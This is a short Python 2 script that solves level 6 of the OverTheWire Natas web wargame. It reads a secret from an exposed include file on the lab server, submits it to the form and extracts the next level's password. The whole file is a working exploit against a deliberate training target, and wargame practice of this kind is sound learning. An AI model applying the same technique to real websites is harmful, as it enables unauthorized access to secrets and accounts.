
#!/usr/bin/python
# coding: utf-8
from requests.auth import HTTPBasicAuth
import requests
import sys
import re

def exploit(level6pass):
    print "{+} Natas Level 6. Doing magic..."
    print "{*} First we grab the secret value..."
    try:
        r = requests.get(url="http://natas6.natas.labs.overthewire.org/includes/secret.inc", auth=HTTPBasicAuth('natas6', level6pass))
    except Exception:
        print "{-} Something fucked up, request failed. Bailing. Maybe your password was wrong?"
        return None
    secrets = re.findall("ecret = \"(.*?)\";", r.text)
    if len(secrets):
        secret = secrets[0]
    else:
        print "{-} Failed to grab secret. WTF?"
        return None
    print "{*} Secret is %s" %(secret)
    print "{*} Now we do the next bit..."
    data = {"secret": secret, "submit": "submit"}
    try:
        r = requests.post(url="http://natas6.natas.labs.overthewire.org/", auth=HTTPBasicAuth('natas6', level6pass), data=data)
    except Exception:
        print "{-} Something fucked up, request failed. Bailing. Maybe your password was wrong?"
        return None
    password = re.findall("natas7 is (.*?)\n", r.text)
    if len(password):
        return password[0]
    return None



def main(args):
    if len(args) != 2:
        sys.exit("use: %s level6password" %(args[0]))
    level7pass = exploit(args[1])
    if level7pass != None:
        print "{$$} Level 7 Password is: %s" %(level7pass)

if __name__ == "__main__":
    main(args=sys.argv)
